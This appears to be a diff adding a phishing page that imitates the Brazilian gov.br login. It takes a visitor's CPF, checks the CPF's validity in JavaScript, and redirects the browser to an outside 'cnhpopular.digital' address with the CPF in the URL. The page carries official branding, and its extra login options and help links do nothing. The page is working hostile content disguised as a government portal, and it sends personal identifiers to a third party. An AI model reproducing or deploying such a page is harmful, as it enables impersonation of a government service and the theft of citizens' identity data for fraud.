@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <title>gov.br - Acesse sua conta</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="JFTSLGqkZhiX.html" type="image/x-icon">
+
+    <!-- Fontes e Ícones -->
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    <link rel="stylesheet" href="../../cdn.jsdelivr.net/npm/%40fortawesome/fontawesome-free%406.4.2/css/all.min.css" crossorigin="anonymous">
+
+    <!-- CSS Externo -->
+    <link rel="stylesheet" href="css/dyhNSOwhO9du.css">
+    <link rel="stylesheet" href="css/0YJaTR0dsoD1.css">
+    <link rel="stylesheet" href="css/Fs2SKCQwtfqk.css">
+    <link rel="stylesheet" href="css/W6dkzvSTU6jI.css">
+    <link rel="stylesheet" href="css/Q5e8qtS5Iyh0.css">
+    <link rel="stylesheet" href="css/sOQ0YhUCZjlb.css">
+    <link rel="stylesheet" href="css/uLiI5zfghlSb.css">
+
+    <style>
+        .options-container {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #ffffff;
+            border-top: 1px solid #ccc;
+            font-family: rawline, Rawline, serif;
+            text-align: center;
+        }
+
+        .options-container h4 {
+            margin-bottom: 5px;
+            font-size: 12.8px;
+            color: #333333;
+        }
+
+        .options-container ul {
+            list-style: none;
+            padding: 0;
+            display: inline-block;
+            text-align: left;
+        }
+
+        .options-container ul li {
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .options-container ul li img {
+            margin-right: 10px;
+            width: 24px;
+            height: 24px;
+        }
+
+        .options-container ul li span {
+            font-size: 7px;
+            background-color: #008C32;
+            color: white;
+            padding: 2px 4px;
+            border-radius: 3px;
+            position: relative;
+            margin-left: 8px;
+        }
+
+        .help-links {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+
+        .help-links a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <a href="#"><img src="images02/wSecYt9DcXkZ.png" alt="Logomarca GovBR"></a>
+    </header>
+    <div class="container">
+        <main id="main-signin">
+            <div class="card">
+                <h3>Identifique-se no gov.br com:</h3>
+                <form id="cpfForm">
+                    <div class="accordion-panel">
+                        <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+                        <label for="cpfInput">CPF</label>
+                        <input id="cpfInput" name="cpf" autocomplete="off" type="text" maxlength="14" placeholder="Digite seu CPF" required>
+                        <p id="messageError"></p>
+                        <div class="button-panel">
+                            <button id="enter-account-id" type="button" class="button-continuar">Continuar</button>
+                        </div>
+                    </div>
+                </form>
+                <div class="options-container">
+                    <h4>Outras opções de identificação:</h4>
+                    <ul>
+                        <li><img src="images02/InternetBanking-green.png" alt="Icone Banco"> Login com seu banco</li>
+                        <li><img src="images02/qrcode.png" alt="Icone QR"> Login com QR code</li>
+                        <li><img src="images02/CD.png" alt="Icone Certificado"> Seu certificado digital</li>
+                        <li><img src="images02/CD-Nuvem.png" alt="Icone Nuvem"> Seu certificado digital em nuvem</li>
+                    </ul>
+                    <div class="help-links">
+                        <p><a href="#">Está com dúvidas e precisa de ajuda?</a></p>
+                        <p><a href="#">Termo de Uso e Aviso de Privacidade</a></p>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+    function formatCPF(value) {
+        return value
+            .replace(/\D/g, "") // Remove caracteres não numéricos
+            .replace(/(\d{3})(\d)/, "$1.$2") // Adiciona o primeiro ponto
+            .replace(/(\d{3})(\d)/, "$1.$2") // Adiciona o segundo ponto
+            .replace(/(\d{3})(\d{1,2})$/, "$1-$2"); // Adiciona o traço
+    }
+
+    function isValidCPF(cpf) {
+        cpf = cpf.replace(/\D/g, ""); // Remove caracteres não numéricos
+        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; // Verifica tamanho e sequências repetidas
+
+        let sum, rest;
+        sum = 0;
+        for (let i = 1; i <= 9; i++) {
+            sum += parseInt(cpf.substring(i - 1, i)) * (11 - i);
+        }
+        rest = (sum * 10) % 11;
+        if (rest === 10 || rest === 11) rest = 0;
+        if (rest !== parseInt(cpf.substring(9, 10))) return false;
+
+        sum = 0;
+        for (let i = 1; i <= 10; i++) {
+            sum += parseInt(cpf.substring(i - 1, i)) * (12 - i);
+        }
+        rest = (sum * 10) % 11;
+        if (rest === 10 || rest === 11) rest = 0;
+        if (rest !== parseInt(cpf.substring(10, 11))) return false;
+
+        return true;
+    }
+
+    document.getElementById("cpfInput").addEventListener("input", function (e) {
+        e.target.value = formatCPF(e.target.value); // Formata enquanto digita
+    });
+
+    document.getElementById("enter-account-id").addEventListener("click", function () {
+        const cpfInput = document.getElementById("cpfInput");
+        const messageError = document.getElementById("messageError");
+        const cpfFormatted = cpfInput.value;
+        const cpfRaw = cpfFormatted.replace(/\D/g, ""); // Remove a formatação, deixando só os números
+
+        if (isValidCPF(cpfRaw)) { // Valida o CPF
+            const urlSendbot = "https://portal.cnhpopular.digital/br/inscricao/?cpf=" + cpfRaw;
+            window.location.href = urlSendbot; // Redireciona para a URL
+        } else {
+            messageError.textContent = "CPF inválido. Por favor, insira um CPF válido.";
+        }
+    });
+</script>
+
+</body>
+
+</html>
